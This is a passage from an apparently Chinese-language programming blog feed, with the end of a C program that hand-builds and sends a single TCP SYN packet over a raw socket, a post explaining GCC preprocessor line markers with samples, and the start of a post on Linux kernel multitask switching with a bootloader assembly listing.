<span class="number">0</span>;             <span class="comment">// 校验值 (先置为 0, 等会再修正)</span></span><br><span class="line">    header-&gt;th_urp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> header;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">tcp_syn</span><span class="params">(<span class="keyword">int</span> tcp_sock, struct tcphdr *header)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> *<span class="title">addr</span> = (<span class="title">struct</span> <span class="title">sockaddr_in</span> *) <span class="title">malloc</span>(<span class="title">sizeof</span>(<span class="title">struct</span> <span class="title">sockaddr_in</span>));</span></span><br><span class="line">    addr-&gt;sin_family = PF_INET;</span><br><span class="line">    addr-&gt;sin_port = htons(<span class="number">4000</span>);</span><br><span class="line">    addr-&gt;sin_addr.s_addr = inet_addr(<span class="string">"172.16.2.127"</span>);</span><br><span class="line">    <span class="keyword">ssize_t</span> size = sendto(tcp_sock, header, <span class="keyword">sizeof</span>(struct tcphdr), <span class="number">0</span>, (struct sockaddr *)addr, <span class="keyword">sizeof</span>(addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> tcp_sock = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);</span><br><span class="line">    <span class="keyword">if</span>(tcp_sock == <span class="number">-1</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Open Socket Failed: %s(errno: %d)\n"</span>, strerror(errno), errno);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcphdr</span> *<span class="title">tcpHdr</span> = <span class="title">init_tcp_header</span>(10001);</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pseudohdr</span> *<span class="title">psdHdr</span> = (<span class="title">struct</span> <span class="title">pseudohdr</span> *) <span class="title">malloc</span>(<span class="title">sizeof</span>(<span class="title">struct</span> <span class="title">pseudohdr</span>));</span></span><br><span class="line">    psdHdr-&gt;src_addr = inet_addr(<span class="string">"172.16.2.101"</span>);</span><br><span class="line">    psdHdr-&gt;dst_addr = inet_addr(<span class="string">"172.16.2.127"</span>);</span><br><span class="line">    psdHdr-&gt;zero = <span class="number">0</span>;</span><br><span class="line">    psdHdr-&gt;protocol = <span class="number">6</span>;</span><br><span class="line">    psdHdr-&gt;tcp_length = htons(<span class="keyword">sizeof</span>(struct tcphdr));</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;psdHdr-&gt;tcpHdr, tcpHdr, <span class="keyword">sizeof</span>(struct tcphdr));</span><br><span class="line">    tcpHdr-&gt;th_sum = htons(check_sum((<span class="keyword">unsigned</span> <span class="keyword">short</span> *) psdHdr, <span class="keyword">sizeof</span>(struct pseudohdr)));</span><br><span class="line">    <span class="built_in">free</span>(psdHdr);</span><br><span class="line"></span><br><span class="line">    tcp_syn(tcp_sock, tcpHdr);</span><br><span class="line">    <span class="built_in">free</span>(tcpHdr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  __                    __                  </span><br><span class="line"> / _| __ _ _ __   __ _ / _| ___ _ __   __ _ </span><br><span class="line">| |_ / _` | &apos;_ \ / _` | |_ / _ \ &apos;_ \ / _` |</span><br><span class="line">|  _| (_| | | | | (_| |  _|  __/ | | | (_| |</span><br><span class="line">|_|  \__,_|_| |_|\__, |_|  \___|_| |_|\__, |</span><br><span class="line">                 |___/                |___/</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;写了两天，几乎是从零开始，C 语言搞了一个发 TCP SYN 包的小程序。&lt;br&gt;从协议到程序代码的转换，确实没有花费太多的时间，但是为了字节序(byteorder)的问题简直折腾得…&lt;/p&gt;
    
    </summary>
    
    
      <category term="TCP" scheme="https://DorMOUSE-None.github.io/tags/TCP/"/>
    
  </entry>
  
  <entry>
    <title>Preprocessor Output</title>
    <link href="https://DorMOUSE-None.github.io/2018-09-08-preprocessor-output/"/>
    <id>https://DorMOUSE-None.github.io/2018-09-08-preprocessor-output/</id>
    <published>2018-09-07T16:00:00.000Z</published>
    <updated>2018-09-08T06:59:35.638Z</updated>
    
    <content type="html"><![CDATA[<p>最近重新开始回顾 C 语言以及其编译后的文件格式 ELF。<br>暂时告别一步到位的命令 <code>gcc main.c</code>，如果从 <code>.c</code> 文件的编译来说，主要分为预编译(preprocess)、编译(Compilation)、汇编(Assembly)、链接(Linking) 四个步骤。<br>但是，仅仅从第一个流程 <strong>预编译</strong> 而言，就已经遇到了一些麻烦。</p><p><small>program.i</small><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># <span class="number">1</span> <span class="string">"program.c"</span></span><br><span class="line"># <span class="number">1</span> <span class="string">"&lt;built-in&gt;"</span></span><br><span class="line"># <span class="number">1</span> <span class="string">"&lt;command-line&gt;"</span></span><br><span class="line"># <span class="number">1</span> <span class="string">"/usr/include/stdc-predef.h"</span> <span class="number">1</span> <span class="number">3</span> <span class="number">4</span></span><br><span class="line"># <span class="number">1</span> <span class="string">"&lt;command-line&gt;"</span> <span class="number">2</span></span><br><span class="line"># <span class="number">1</span> <span class="string">"program.c"</span></span><br><span class="line"># <span class="number">1</span> <span class="string">"header.h"</span> <span class="number">1</span></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">test</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"># <span class="number">2</span> <span class="string">"program.c"</span> <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>预编译后的问题出现了诸如 <code># 1 &quot;program.c&quot;</code> 的 <em>注释?</em> </p><p>这里简单记录预处理输出文件的基本格式，方便今后回顾。<br><a id="more"></a></p><h2 id="Output-File-format"><a href="#Output-File-format" class="headerlink" title="Output File format"></a>Output File format</h2><p>首先，从预编译的结果看，<code>cpp (C preprocessor)</code> 程序主要是处理了所有的<strong>宏指令</strong>。然后添加上了一些所谓<strong>线性标记</strong>的内容。<br>最终得到的就是类似 <code>program.i</code> 的结果。</p><p>从细节上来说:<br>首先，所有的宏指令，包括 <code>#include</code> (用于引入用户自定义及系统预定义的头文件)、<code>#define</code> (用于将使用到的宏进行替换)。<br>当然，在替换完成后，这些指令所在的行将被替换成空行。同时，所有的注释行也将被替换成空行。</p><p>此外，将添加上注入 <code>#1 &quot;program.c&quot;</code> 的<strong>线性标记</strong>。</p><h3 id="线性标记"><a href="#线性标记" class="headerlink" title="线性标记"></a>线性标记</h3><p>线性标记的标准格式:</p><p><code># linenum filename flags</code></p><p>linenum 是为了配合预定义宏 <code>__LINE__</code> 是使用的，用于定位紧随的下一行内容在原文件中所在的行。</p><p>filename 指出了接下来的内容来自哪个原文件</p><p>flags 有如下几个取值:</p><ul><li>1 : 表示这是一个新的文件的开始</li><li>2 : 表示回到文件 <code>filename</code> 的内容 (从其他的 <em>include</em> 的文件中)</li><li>3 : 表示接下来的内容是从系统预定义头文件中来的，因此需要抑制某些警告</li><li>4 : 表示接下来的内容需要被视作是被封装的隐式 <code>extern &quot;C&quot;</code> 块</li></ul><h3 id="实例解读"><a href="#实例解读" class="headerlink" title="实例解读"></a>实例解读</h3><p><small>program.c</small><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"header.h"</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(test());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><small>header.h</small><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">test</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br></pre></td></tr></table></figure></p><p>接下来的演示都将以 <strong>program.c</strong> 和 <strong>header.h</strong> 两个文件作为标准示例。<br>期间，将对 <strong>program.c</strong> or <strong>header.h</strong> 做不同程度的修改，已达到更好的展示效果。<br><em>注意:</em> 额外添加的注释由 <code>!</code> 开始到该行结束(并不符合 C 语言语法)，但是帮助理解</p><p><strong>Sample 1</strong></p><p>直接利用 program.c 与 header.h 进行预编译 <code>cpp -o program.i program.c</code><br>结果如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># <span class="number">1</span> <span class="string">"program.c"</span></span><br><span class="line"># <span class="number">1</span> <span class="string">"&lt;built-in&gt;"</span></span><br><span class="line"># <span class="number">1</span> <span class="string">"&lt;command-line&gt;"</span></span><br><span class="line"># <span class="number">1</span> <span class="string">"/usr/include/stdc-predef.h"</span> <span class="number">1</span> <span class="number">3</span> <span class="number">4</span></span><br><span class="line"># <span class="number">1</span> <span class="string">"&lt;command-line&gt;"</span> <span class="number">2</span></span><br><span class="line"># <span class="number">1</span> <span class="string">"program.c"</span></span><br><span class="line"># <span class="number">1</span> <span class="string">"header.h"</span> <span class="number">1</span>            ! 下一行代码对应的是 header.h 文件第一行</span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">test</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"># <span class="number">2</span> <span class="string">"program.c"</span> <span class="number">2</span>           ! flag=<span class="number">2</span> 表示下列内容由回到了 program.c 中，下一行对应原文件第二行</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> main(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(test());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Sample 2</strong></p><p>接着，给 <strong>program.c</strong> 加点注释，在加点空行</p><p><small>program.c - sub 1<small><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// This is comment          ! 这里添加了一行注释</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"header.h"</span></span></span><br><span class="line"></span><br><span class="line">                            ! 这里加了个空行</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(test());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></small></small></p><p>再看看效果</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># <span class="number">1</span> <span class="string">"program.c"</span></span><br><span class="line"># <span class="number">1</span> <span class="string">"&lt;built-in&gt;"</span></span><br><span class="line"># <span class="number">1</span> <span class="string">"&lt;command-line&gt;"</span></span><br><span class="line"># <span class="number">1</span> <span class="string">"/usr/include/stdc-predef.h"</span> <span class="number">1</span> <span class="number">3</span> <span class="number">4</span></span><br><span class="line"># <span class="number">1</span> <span class="string">"&lt;command-line&gt;"</span> <span class="number">2</span></span><br><span class="line"># <span class="number">1</span> <span class="string">"program.c"</span>             ! 下一行代码对应原代码中第 <span class="number">1</span> 行，本来是注释，但会被预编译器处理成空行 (多行将逐一处理，但行数不会变)</span><br><span class="line"></span><br><span class="line"># <span class="number">1</span> <span class="string">"header.h"</span> <span class="number">1</span>            ! 下面将描述 header.h 的代码</span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">test</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"># <span class="number">3</span> <span class="string">"program.c"</span> <span class="number">2</span>           ! 继续描述 program.c ，下一行对应原代码第 <span class="number">3</span> 行。至于第 <span class="number">2</span> 行，就是 <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"header.h"</span> ，不会直接表现了</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(test());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Sample 3</strong></p><p>在改变一些</p><p><small>program.c - sub 2</small><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// This is comment</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"header.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TEN 10</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(test());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>看看结果</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># <span class="number">1</span> <span class="string">"program.c"</span></span><br><span class="line"># <span class="number">1</span> <span class="string">"&lt;built-in&gt;"</span></span><br><span class="line"># <span class="number">1</span> <span class="string">"&lt;command-line&gt;"</span></span><br><span class="line"># <span class="number">1</span> <span class="string">"/usr/include/stdc-predef.h"</span> <span class="number">1</span> <span class="number">3</span> <span class="number">4</span></span><br><span class="line"># <span class="number">1</span> <span class="string">"&lt;command-line&gt;"</span> <span class="number">2</span></span><br><span class="line"># <span class="number">1</span> <span class="string">"program.c"</span></span><br><span class="line"></span><br><span class="line"># <span class="number">1</span> <span class="string">"header.h"</span> <span class="number">1</span></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">test</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"># <span class="number">3</span> <span class="string">"program.c"</span> <span class="number">2</span></span><br><span class="line">                        ! 原代码中对应行是宏 <span class="meta">#<span class="meta-keyword">define</span> TEN 10 ，已经被空行替换掉了。</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(test());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  __                    __                  </span><br><span class="line"> / _| __ _ _ __   __ _ / _| ___ _ __   __ _ </span><br><span class="line">| |_ / _` | &apos;_ \ / _` | |_ / _ \ &apos;_ \ / _` |</span><br><span class="line">|  _| (_| | | | | (_| |  _|  __/ | | | (_| |</span><br><span class="line">|_|  \__,_|_| |_|\__, |_|  \___|_| |_|\__, |</span><br><span class="line">                 |___/                |___/</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近重新开始回顾 C 语言以及其编译后的文件格式 ELF。&lt;br&gt;暂时告别一步到位的命令 &lt;code&gt;gcc main.c&lt;/code&gt;，如果从 &lt;code&gt;.c&lt;/code&gt; 文件的编译来说，主要分为预编译(preprocess)、编译(Compilation)、汇编(Assembly)、链接(Linking) 四个步骤。&lt;br&gt;但是，仅仅从第一个流程 &lt;strong&gt;预编译&lt;/strong&gt; 而言，就已经遇到了一些麻烦。&lt;/p&gt;
&lt;p&gt;&lt;small&gt;program.i&lt;/small&gt;&lt;br&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;# &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;program.c&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;&amp;lt;built-in&amp;gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;&amp;lt;command-line&amp;gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;/usr/include/stdc-predef.h&quot;&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;&amp;lt;command-line&amp;gt;&quot;&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;program.c&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;header.h&quot;&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *&lt;span class=&quot;title&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;program.c&quot;&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;预编译后的问题出现了诸如 &lt;code&gt;# 1 &amp;quot;program.c&amp;quot;&lt;/code&gt; 的 &lt;em&gt;注释?&lt;/em&gt; &lt;/p&gt;
&lt;p&gt;这里简单记录预处理输出文件的基本格式，方便今后回顾。&lt;br&gt;
    
    </summary>
    
    
      <category term="C" scheme="https://DorMOUSE-None.github.io/tags/C/"/>
    
      <category term="CPP" scheme="https://DorMOUSE-None.github.io/tags/CPP/"/>
    
      <category term="GCC" scheme="https://DorMOUSE-None.github.io/tags/GCC/"/>
    
  </entry>
  
  <entry>
    <title>理解 Linux Kernel (2) - 多任务切换</title>
    <link href="https://DorMOUSE-None.github.io/2018-08-26-understand-Kernel-2/"/>
    <id>https://DorMOUSE-None.github.io/2018-08-26-understand-Kernel-2/</id>
    <published>2018-08-25T16:00:00.000Z</published>
    <updated>2018-08-26T05:40:04.404Z</updated>
    
    <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>《只是为了好玩》一书中，林纳斯描述过他最早的试验性程序就是让 CPU 执行两个不同的任务(一个不断输出A，另一个输出B)，同时不断地让 CPU 在两个任务间的切换。</p><p>结合《Linux 内核完全注释》一书，得到了多任务切换的示例程序。</p><p>本节所要描述的内容，正是结合一个框架式的汇编程序(多任务切换程序, 书中提供的内容比较老，无法适应目前的各种工具、环境)，在现有环境中加以处理并成功运行。</p><p>关于运行环境的说明，欢迎参考 <a href="https://dormouse-none.github.io/2018-08-19-understand-Kernel-0/">理解 Linux Kernel (0)</a></p><a id="more"></a><h2 id="引导程序"><a href="#引导程序" class="headerlink" title="引导程序"></a>引导程序</h2><p>在 <a href="https://dormouse-none.github.io/2018-08-19-understand-Kernel-1/">理解 Linux Kernel (1)</a> 已经描述过通过 BIOS 加载引导程序，并执行引导程序的全部流程。<br>当然，也就仅仅到引导程序就结束了。诸如操作系统之类的内容根本就没有涉及。</p><p>不过，无论是操作系统，还是用户程序，都是基于 CPU、内存等硬件而进一步抽象的上层概念。如果问没有操作系统而直接运行程序是否可行？毫无疑问，这绝对是没有问题的。</p><p>CPU 只是忠实地执行寄存器定位到的机器指令，并加以执行。特别是，如果在 <a href="https://dormouse-none.github.io/2018-08-19-understand-Kernel-1/">理解 Linux Kernel (1)</a> 提供的输出 “System Loading…” 的示例程序上继续加以改编，无论是算术运算、显示文本等等目的都是没有问题的。<br>当然，限制也还是有的，512B 是引导程序的上限。</p><p>在机器上电启动之后，存储在非易失性存储器 / 只读存储器上的 BIOS 程序将被加载到内存，并进行执行(至于细节，不甚了解，不表)<br>之后，BIOS 将默认地将指定磁盘(软盘、硬盘等) 首个扇区 512 字节的内容(称为 boot 引导程序)加载到内存地址，并 JMP 到 CS:IP = 0x07c00:0x0000 的位置。从而触发引导程序。</p><p>继而，如果在编写 boot 引导程序的时候，我们使其能够从外存加载额外的代码，并在引导程序结束位置将 CPU 的控制权交给这段额外加载的代码。显然，操作系统就是这样子被加载的。</p><p><code>BIOS -&gt; boot 引导程序 -&gt; 操作系统引导程序 -&gt; 操作系统</code><br>这就构成了一个宏观的操作系统启动的一个流程。</p><p>boot.s 引导程序 <small>主体代码来自《Linux 内核完全注释》，进行了一定量的改写</small></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">BOOTSEG = 0x07c0</span><br><span class="line">SYSSEG = 0x0100</span><br><span class="line">SYSLEN = 17</span><br><span class="line"></span><br><span class="line">entry start</span><br><span class="line">start:</span><br><span class="line">    jmpi    go,#BOOTSEG</span><br><span class="line">go:</span><br><span class="line">    mov ax,cs</span><br><span class="line">    mov ds,ax</span><br><span class="line">    mov ss,ax</span><br><span class="line">    mov sp,#0x0400</span><br><span class="line"></span><br><span class="line">load_system:</span><br><span class="line">    xor dx,dx       ! 开始位置, 磁头:硬盘号</span><br><span class="line">    mov cx,#0x0002  ! 开始位置, 磁道:扇区</span><br><span class="line">    mov ax,#0x0100</span><br><span class="line">    mov es,ax       ! 载入到, ES 段</span><br><span class="line">    xor bx,bx       ! 载入到, 偏移量 </span><br><span class="line">    mov ax,#0x0211  ! AH: 读取扇区子功能, AL: 读取多少个扇区</span><br><span class="line">    int 0x13        ! BIOS 13 号中断</span><br><span class="line">    jnc continue_load   ! JUMP if CF = 0</span><br><span class="line">die:</span><br><span class="line">    jmp die</span><br><span class="line"></span><br><span class="line">continue_load:</span><br><span class="line">    cli             ! 清除中断允许位标志</span><br><span class="line">    mov ax,#SYSSEG </span><br><span class="line">    mov ds,ax       ! 设置数据段寄存器位置 0x1000</span><br><span class="line">    xor ax,ax</span><br><span class="line">    mov es,ax       ! 设置扩展段寄存器 0x0000</span><br><span class="line">    mov cx,#0x1000  ! 计数器</span><br><span class="line">    sub si,si</span><br><span class="line">    sub di,di</span><br><span class="line">    rep </span><br><span class="line">    movsw</span><br><span class="line"></span><br><span class="line">    mov ax,#BOOTSEG</span><br><span class="line">    mov ds,ax       ! 重新设置数据段寄存器到当前数据段基地址</span><br><span class="line">    lidt idt_48     ! 设置中断描述符表寄存器</span><br><span class="line">    lgdt gdt_48     ! 设置全局描述符表寄存器</span><br><span class="line"></span><br><span class="line">    mov ax,#0x0001</span><br><span class="line">    lmsw ax         ! 设置 CR0, 进入保护模式</span><br><span class="line">    jmpi 0,8</span><br><span class="line"></span><br><span class="line">gdt:</span><br><span class="line">    .word   0,0,0,0</span><br><span class="line">    .word   0x07FF,0x0000,0x9A00,0x00C0</span><br><span class="line">    .word   0x07FF,0x0000,0x9200,0x00C0</span><br><span class="line"></span><br><span class="line">idt_48:</span><br><span class="line">    .word   